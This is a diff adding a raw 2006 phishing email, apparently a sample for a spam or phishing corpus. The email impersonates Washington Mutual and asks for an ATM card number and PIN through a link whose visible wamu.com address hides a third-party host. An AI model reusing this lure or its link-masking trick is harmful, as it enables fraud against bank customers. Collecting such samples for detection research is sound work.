@@ -1,0 +1,89 @@
+Return-Path: <noreply@wamu.com>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 2566F468E4
+	for <user@login.example.com>; Sat,  9 Dec 2006 15:24:58 -0500 (EST)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id 26DC8131FCBF
+	for <user@example.com>; Sat,  9 Dec 2006 15:24:58 -0500 (EST)
+Received: from nlpi012.sbcis.sbc.com (nlpi012.sbcis.sbc.com [207.115.36.41])
+	by mail.example.org (Postfix) with ESMTP id 1DAB06FA1C1
+	for <user@example.com>; Sat,  9 Dec 2006 15:24:58 -0500 (EST)
+X-ORBL: [66.126.129.226]
+Received: from admin (adsl-66-126-129-226.dsl.frs2ca.pacbell.net [66.126.129.226] (may be forged))
+	by nlpi012.sbcis.sbc.com (8.13.8 out.dk.spool/8.13.8) with SMTP id kB9KOOrT022122;
+	Sat, 9 Dec 2006 14:24:25 -0600
+Message-Id: <200612092024.kB9KOOrT022122@nlpi012.sbcis.sbc.com>
+From: <noreply@wamu.com>
+Subject: Security - Unlock Your Account Access
+Date: Sat, 9 Dec 2006 12:24:45 -0800
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="Windows-1251"
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2600.0000
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2600.0000
+To: undisclosed-recipients:;
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 501
+
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link rel="stylesheet" type="text/css" href="http://www.wamu.com/css/master.css">
+<link rel="stylesheet" type="text/css" media="print" href="http://www.wamu.com/css/print.css">
+<title>Dear Washington Mutual customer</title>
+</head>
+
+<body bgcolor="#FFFFFF" style="background-color:#FFFFFF">
+<table width="640" cellpadding="0" cellspacing="0" bordercolor="#000000" bgcolor="#FFFFFF" id="maincontent" style="border-width:1px; border-color:#000000">
+  <tr>
+    <td bgcolor="#FFFFFF" scope="col"><img src="http://www.wamu.com/images/public/wamu_logo.gif"></td>
+  </tr>
+  <tr>
+    <td width="630" background="http://www.wamu.com/images/public/bg_primary-nav_liquid.gif" scope="col">&nbsp;</td>
+  </tr>
+  <tr>
+    <td><p align="justify"><br>Dear Washington Mutual customer, </p>
+    <p align="justify">We recently reviewed your account, and suspect that your Washington Mutual 
+Internet Banking account has been accessed by an unauthorized third party.Protecting the security of your account and of the Washington Mutual network is 
+our primary concern. Therefore, as a preventative measure, your profile has been locked due to inactivity or because of too many failed login attempts.<br>
+<br>
+To restore your account access, please take the following steps to ensure that 
+your account has not been compromised:
+<br>
+<br>
+<img src="http://www.wamu.com/NR/rdonlyres/50D80255-1268-449C-AC7C-DE7951DDAD5D/0/alert.gif" width="12" height="12"> 1. You can unlock your profile online with your <a href="http://www.48net.com/logo/wamu.com/unlock/index.html">ATM/Visa Check Card number and PIN</a>  by following the link bellow. <br>
+<br>
+To get started, please click the link below:</p></td>
+  </tr>
+  <tr>
+    <td class="error"><a href="http://www.48net.com/logo/wamu.com/unlock/index.html">https://login.personal.wamu.com/error/SignOnError.asp</a></td>
+  </tr>
+  <tr>
+    <td><br>      
+      We apologize for any inconvenience this may cause, and appreciate your 
+assistance in helping us maintain the integrity of
+the entire Washington Mutual 
+system. Thank you for attention to this matter.<br><br>
+Sincerely,<br>
+<br>
+The Washington Mutual Team<br>
+<br>
+Please do not reply to this e-mail. Mail sent to this address cannot be 
+answered. For assistance, log in to your<br>
+Washington Mutual account and choose 
+the &quot;Help&quot; link in the header of any page.<br>&nbsp;</td>
+  </tr>
+</table>
+</body>
+
+</html>
+
